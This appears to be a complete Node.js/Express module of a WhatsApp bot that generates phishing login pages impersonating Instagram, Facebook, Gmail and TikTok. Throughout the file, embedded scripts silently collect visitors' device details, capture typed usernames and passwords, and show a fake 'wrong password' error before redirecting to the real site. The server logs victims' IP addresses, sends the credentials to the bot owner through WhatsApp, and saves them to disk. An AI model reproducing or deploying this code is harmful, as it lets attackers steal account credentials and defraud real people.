// ============================================================
// MODULE: phishing.js
// Instagram, Facebook, Gmail, TikTok phishing pages
// ============================================================
// Each page:
//  1. Displays a realistic login form
//  2. Captures email/username + password + device info
//  3. Shows "wrong password" error (looks legit)
//  4. Redirects to real site after a few seconds
//  5. Sends captured data to the user's WhatsApp
// ============================================================

const express = require('express');
const crypto  = require('crypto');
const path    = require('path');
const router  = express.Router();

// In-memory store for phishing sessions
const _phishStore = {};

// Cleanup old sessions every 30 minutes
setInterval(() => {
  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
  for (const tok of Object.keys(_phishStore)) {
    if ((_phishStore[tok].createdAt || 0) < cutoff) delete _phishStore[tok];
  }
}, 30 * 60 * 1000);

// ── Detect public host (same logic as location.js) ───────────
function getPublicHost() {
  return (global._detectedPublicHost || '')
    || (process.env.HEROKU_APP_NAME  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` : '')
    || (process.env.APP_URL          ? process.env.APP_URL.replace(/\/$/, '') : '')
    || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
    || `http://localhost:${process.env.PORT || 3001}`;
}

// ── Device info capture script (embedded in every page) ──────
const DEVICE_SCRIPT = `
<script>
(function(){
  var tok = document.currentScript.getAttribute('data-tok');
  var BASE = window.location.origin;
  // Send device info silently
  var info = {
    ua: navigator.userAgent,
    platform: navigator.platform || '',
    lang: navigator.language,
    screen: screen.width+'x'+screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: navigator.cookieEnabled,
    cores: navigator.hardwareConcurrency || null
  };
  fetch(BASE + '/api/phish/log/' + tok, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(info)
  }).catch(function(){});
})();
</script>`;

// ── Submit handler JS (embedded in every page) ───────────────
const SUBMIT_SCRIPT = `
<script>
(function(){
  var tok = document.currentScript.getAttribute('data-tok');
  var BASE = window.location.origin;
  var f = document.getElementById('loginForm');
  if (!f) return;
  f.addEventListener('submit', function(e) {
    e.preventDefault();
    var data = {};
    var inputs = f.querySelectorAll('input');
    inputs.forEach(function(inp) { data[inp.name] = inp.value; });
    // Send credentials to server
    fetch(BASE + '/api/phish/capture/' + tok, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(data)
    }).then(function(r) { return r.json(); }).then(function(j) {
      // Show error and redirect
      var errBox = document.getElementById('errorBox');
      if (errBox) {
        errBox.style.display = 'block';
        errBox.textContent = j.error || 'Wrong password. Try again.';
      }
      setTimeout(function() {
        window.location.href = j.redirect || 'https://www.instagram.com';
      }, 3000);
    }).catch(function() {
      window.location.href = 'https://www.instagram.com';
    });
  });
})();
</script>`;

// ── CSS for dark-themed modern login pages ────────────────────
const LOGIN_CSS = `
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
body{
  min-height:100vh;
  background:#000;
  display:flex;align-items:center;justify-content:center;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
  padding:16px;
}
.card{
  background:#1a1a2e;
  border-radius:16px;
  padding:40px 32px;
  max-width:400px;width:100%;
  box-shadow:0 8px 32px rgba(0,0,0,0.5);
}
.logo{text-align:center;margin-bottom:28px}
.logo svg{width:48px;height:48px}
.logo h1{color:#fff;font-size:24px;margin-top:8px;font-weight:700}
.logo p{color:rgba(255,255,255,0.4);font-size:13px;margin-top:4px}
.input-group{margin-bottom:16px}
.input-group label{color:rgba(255,255,255,0.5);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;display:block;margin-bottom:6px}
.input-group input{
  width:100%;padding:12px 14px;border:1px solid rgba(255,255,255,0.1);
  border-radius:10px;background:rgba(255,255,255,0.05);color:#fff;
  font-size:15px;outline:none;transition:border-color 0.2s
}
.input-group input:focus{border-color:#0095f6}
.input-group input::placeholder{color:rgba(255,255,255,0.2)}
.btn{
  width:100%;padding:12px;border:none;border-radius:10px;
  font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;
  transition:opacity 0.2s;touch-action:manipulation
}
.btn:active{opacity:0.8}
.btn-primary{background:#0095f6;color:#fff}
.btn-facebook{background:#1877f2;color:#fff}
.btn-tiktok{background:#fe2c55;color:#fff}
.btn-google{background:#fff;color:#1a1a2e}
.error{
  display:none;background:rgba(237,73,86,0.15);
  border:1px solid rgba(237,73,86,0.3);color:#ed4956;
  padding:10px 14px;border-radius:10px;font-size:13px;
  text-align:center;margin-bottom:16px
}
.divider{text-align:center;color:rgba(255,255,255,0.2);font-size:12px;margin:16px 0;position:relative}
.divider::before,.divider::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:rgba(255,255,255,0.08)}
.divider::before{left:0}.divider::after{right:0}
.footer{text-align:center;margin-top:20px}
.footer a{color:rgba(255,255,255,0.3);font-size:12px;text-decoration:none;margin:0 8px}
.footer a:hover{color:rgba(255,255,255,0.5)}
</style>`;

// ── Phishing page generators ──────────────────────────────────

function instagramPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Instagram • Login</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect x='4' y='4' width='40' height='40' rx='8' fill='%23fff'/><rect x='10' y='10' width='28' height='28' rx='6' fill='none' stroke='%23000' stroke-width='2'/><circle cx='24' cy='24' r='7' fill='none' stroke='%23000' stroke-width='2'/><circle cx='34' cy='14' r='2' fill='%23000'/></svg>">
${LOGIN_CSS}</head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><rect x='4' y='4' width='40' height='40' rx='8' fill='url(#ig)'/><linearGradient id='ig' x1='0' y1='0' x2='48' y2='48'><stop offset='0%' stop-color='%23fdf497'/><stop offset='25%' stop-color='%23fdf497'/><stop offset='50%' stop-color='%23fd5949'/><stop offset='75%' stop-color='%23d6249f'/><stop offset='100%' stop-color='%23285AEB'/></linearGradient><rect x='10' y='10' width='28' height='28' rx='6' fill='none' stroke='%23fff' stroke-width='2'/><circle cx='24' cy='24' r='7' fill='none' stroke='%23fff' stroke-width='2'/><circle cx='34' cy='14' r='2' fill='%23fff'/></svg>
    <h1>Instagram</h1>
    <p>Log in to see photos & videos from your friends.</p>
  </div>
  <div class="error" id="errorBox">Wrong password. Try again.</div>
  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Phone number, username, or email</label>
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn btn-primary">Log In</button>
  </form>
  <div class="divider">OR</div>
  <div class="footer">
    <a href="#">Forgot password?</a>
    <a href="#">Sign up</a>
  </div>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://www.instagram.com'")}
</body></html>`;
}

function facebookPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Facebook • Log in</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><circle cx='24' cy='24' r='24' fill='%231877f2'/><path d='M28 8H20v12h-4v6h4v14h6V26h5l1-6h-6V12c0-1.1.9-2 2-2h4V8z' fill='%23fff'/></svg>">
${LOGIN_CSS}</head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><circle cx='24' cy='24' r='24' fill='%231877f2'/><path d='M28 8H20v12h-4v6h4v14h6V26h5l1-6h-6V12c0-1.1.9-2 2-2h4V8z' fill='%23fff'/></svg>
    <h1>Facebook</h1>
    <p>Log in to your account</p>
  </div>
  <div class="error" id="errorBox">Incorrect email or password.</div>
  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Email or phone number</label>
      <input type="text" name="email" placeholder="Email or phone number" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn btn-facebook">Log In</button>
  </form>
  <div class="divider">OR</div>
  <div class="footer">
    <a href="#">Forgotten account?</a>
    <a href="#">Sign up for Facebook</a>
  </div>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://www.facebook.com'")}
</body></html>`;
}

function gmailPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Gmail • Sign in</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path d='M6 36V12l18 12 18-12v24H6z' fill='%23fff'/><path d='M6 12v4l18 12 18-12v-4H6z' fill='%23e8e8e8'/><path d='M6 14v2l18 12 18-12v-2H6z' fill='%23db4437'/><path d='M42 14l-18 12L6 14V12h36v2z' fill='%23c5221f'/></svg>">
${LOGIN_CSS}
<style>.card{max-width:420px}.btn-google{background:#fff;color:#1a1a2e;border:1px solid rgba(255,255,255,0.1)}</style>
</head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><path d='M6 36V12l18 12 18-12v24H6z' fill='%23fff'/><path d='M6 12v4l18 12 18-12v-4H6z' fill='%23e8e8e8'/><path d='M6 14v2l18 12 18-12v-2H6z' fill='%23db4437'/><path d='M42 14l-18 12L6 14V12h36v2z' fill='%23c5221f'/></svg>
    <h1>Google</h1>
    <p>Sign in to continue to Gmail</p>
  </div>
  <div class="error" id="errorBox">Couldn't find your Google Account.</div>
  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Email or phone</label>
      <input type="text" name="email" placeholder="Email or phone number" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Enter your password" required>
    </div>
    <button type="submit" class="btn btn-google">Next</button>
  </form>
  <div class="footer">
    <a href="#">Forgot email?</a>
    <a href="#">Create account</a>
  </div>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://mail.google.com'")}
</body></html>`;
}

function tiktokPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>TikTok • Log in</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect width='48' height='48' rx='8' fill='%23000'/><path d='M34 12h-4v10c0 3.3-2.7 6-6 6s-6-2.7-6-6 2.7-6 6-6v-4c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10V12z' fill='%23fe2c55'/><path d='M38 12h-4l-4 4v-4h-4v15c0 3.3 2.7 6 6 6s6-2.7 6-6V12z' fill='%2325f4ee'/></svg>">
${LOGIN_CSS}
<style>.card{max-width:400px}</style>
</head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><rect width='48' height='48' rx='8' fill='%23000'/><path d='M34 12h-4v10c0 3.3-2.7 6-6 6s-6-2.7-6-6 2.7-6 6-6v-4c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10V12z' fill='%23fe2c55'/><path d='M38 12h-4l-4 4v-4h-4v15c0 3.3 2.7 6 6 6s6-2.7 6-6V12z' fill='%2325f4ee'/></svg>
    <h1>TikTok</h1>
    <p>Log in to your account</p>
  </div>
  <div class="error" id="errorBox">Invalid username or password.</div>
  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Username or email</label>
      <input type="text" name="username" placeholder="Username or email" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn btn-tiktok">Log In</button>
  </form>
  <div class="divider">OR</div>
  <div class="footer">
    <a href="#">Forgot password?</a>
    <a href="#">Sign up</a>
  </div>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://www.tiktok.com'")}
</body></html>`;
}

// ================================================================
// ROUTES
// ================================================================

// ── POST /api/phish/create  →  create a phishing session ──────
router.post('/create', (req, res) => {
  const { type, userId } = req.body;
  const validTypes = ['instagram', 'facebook', 'gmail', 'tiktok'];
  if (!validTypes.includes(type)) return res.status(400).json({ error: 'Invalid type. Use: instagram, facebook, gmail, tiktok' });
  if (!userId) return res.status(400).json({ error: 'Missing userId' });

  const sessionToken = crypto.randomBytes(16).toString('hex');
  _phishStore[sessionToken] = {
    type,
    userId,
    device: null,
    credentials: null,
    capturedAt: null,
    ip: null,
    createdAt: Date.now()
  };

  const host = getPublicHost();
  const link = `${host}/secure-login/${type}/${sessionToken}`;
  res.json({ sessionToken, link, type });
});

// ── GET /secure-login/:type/:sessionToken  →  serve phishing page ──
router.get('/:type/:sessionToken', (req, res) => {
  const { type, sessionToken } = req.params;
  const s = _phishStore[sessionToken];
  if (!s || s.type !== type) return res.status(404).send('Link expired or invalid.');

  // Record IP
  s.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  s.createdAt = Date.now();

  let html;
  switch (type) {
    case 'instagram': html = instagramPage(sessionToken); break;
    case 'facebook':  html = facebookPage(sessionToken); break;
    case 'gmail':     html = gmailPage(sessionToken); break;
    case 'tiktok':    html = tiktokPage(sessionToken); break;
    default: return res.status(404).send('Invalid page type.');
  }

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// ── POST /api/phish/log/:sessionToken  →  log device info ────
router.post('/log/:sessionToken', (req, res) => {
  const s = _phishStore[req.params.sessionToken];
  if (!s) return res.status(404).json({ error: 'Session not found' });
  s.device = req.body;
  res.json({ ok: true });
});

// ── POST /api/phish/capture/:sessionToken  →  capture credentials ──
router.post('/capture/:sessionToken', express.json({ limit: '100kb' }), (req, res) => {
  const s = _phishStore[req.params.sessionToken];
  if (!s) return res.status(404).json({ error: 'Session not found' });

  s.credentials = req.body;
  s.capturedAt = Date.now();
  s.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;

  // Try to send data to bot owner via global messenger
  try {
    if (typeof global._sendPhishToWhatsApp === 'function') {
      global._sendPhishToWhatsApp(s.type, req.body, s.device, s.ip, s.userId);
    }
  } catch (_) {}

  // Always write to file as fallback
  try {
    const fs = require('fs');
    const p = require('path');
    const dir = p.join(__dirname, '../../database');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    const reportFile = p.join(dir, `phish_${req.params.sessionToken}.json`);
    fs.writeFileSync(reportFile, JSON.stringify({
      type: s.type, credentials: s.credentials, device: s.device,
      ip: s.ip, capturedAt: s.capturedAt, userId: s.userId
    }, null, 2));
  } catch (_) {}

  // Return error to victim (looks legit) + redirect
  const redirectMap = { instagram: 'https://www.instagram.com', facebook: 'https://www.facebook.com', gmail: 'https://mail.google.com', tiktok: 'https://www.tiktok.com' };
  res.json({ error: 'Wrong password. Try again.', redirect: redirectMap[s.type] || 'https://www.instagram.com' });
});

// ── GET /api/phish/result/:sessionToken  →  fetch captured data ──
router.get('/result/:sessionToken', (req, res) => {
  const s = _phishStore[req.params.sessionToken];
  if (!s) return res.status(404).json({ error: 'Session not found or expired' });
  res.json({
    type: s.type,
    userId: s.userId,
    ip: s.ip,
    device: s.device,
    credentials: s.credentials,
    capturedAt: s.capturedAt,
    createdAt: s.createdAt
  });
});

// ── renderPage: generate HTML for a given type and token (used by clean URLs) ──
function renderPage(type, sessionToken) {
  switch (type) {
    case 'instagram': return instagramPage(sessionToken);
    case 'facebook':  return facebookPage(sessionToken);
    case 'gmail':     return gmailPage(sessionToken);
    case 'tiktok':    return tiktokPage(sessionToken);
    default: return null;
  }
}

module.exports = router;
module.exports._phishStore = _phishStore;
module.exports.renderPage = renderPage;
